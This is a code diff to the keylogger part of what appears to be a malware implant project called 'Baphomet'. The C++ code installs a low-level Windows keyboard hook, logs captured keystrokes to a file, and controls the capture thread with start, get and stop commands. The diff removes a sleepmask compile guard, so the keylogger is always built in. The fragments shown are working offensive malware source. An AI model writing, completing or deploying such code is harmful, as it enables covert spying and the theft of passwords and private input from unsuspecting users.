@@ -4,8 +4,6 @@
 
 #include <reconaissance.hpp>
 
-#ifndef BAPHOMET_USE_SLEEPMASK
-
 HANDLE
 recon::create_log_file() {
 
@@ -114,6 +112,7 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
     		}
             break;
 
+
         case keylog_action::START:
             if(!WriteFile(
                 hlogfile,
@@ -126,6 +125,7 @@ recon::interact_with_log_file(std::string &buffer, const keylog_action action) {
                 return false;
             }
             break;
+
 
         case keylog_action::STOP:
     		trap = true;
@@ -293,6 +293,7 @@ recon::keylogger_thread_entry(void* unused) {
     MSG     msg  = { 0 };
     HHOOK   hook = nullptr;
 
+
     hook = SetWindowsHookExW(
         WH_KEYBOARD_LL,
         keyboard_proc,
@@ -314,21 +315,14 @@ recon::keylogger_thread_entry(void* unused) {
 	return EXIT_SUCCESS;
 }
 
-#endif // ifndef BAPHOMET_USE_SLEEPMASK
-
 
 bool
 recon::keylog(const keylog_action action, std::string &buffer) {
 
-#ifdef BAPHOMET_USE_SLEEPMASK
-    buffer = "This command is not supported with sleepmask enabled.";
-    return false;
-#else
-
     static HANDLE hkeylogger_thread = nullptr;
 
     switch(action) {
-        case keylog_action::START:
+    	case keylog_action::START:
 
             if(hkeylogger_thread != nullptr) {
                 buffer = "keylogging has already started.";
@@ -352,6 +346,7 @@ recon::keylog(const keylog_action action, std::string &buffer) {
 			buffer = "successfully started keylogger thread with TID: " + std::to_string(GetThreadId(hkeylogger_thread));
 			break;
 
+
         case keylog_action::GET:
         	if(hkeylogger_thread == nullptr) {
         		buffer = "keylogging has not started.";
@@ -363,6 +358,7 @@ recon::keylog(const keylog_action action, std::string &buffer) {
 				return false;
         	}
             break;
+
 
         case keylog_action::STOP:
             if(hkeylogger_thread == nullptr) {
@@ -383,8 +379,6 @@ recon::keylog(const keylog_action action, std::string &buffer) {
     }
 
 	return true;
-
-#endif //ifdef BAPHOMET_USE_SLEEPMASK
 }
 
 
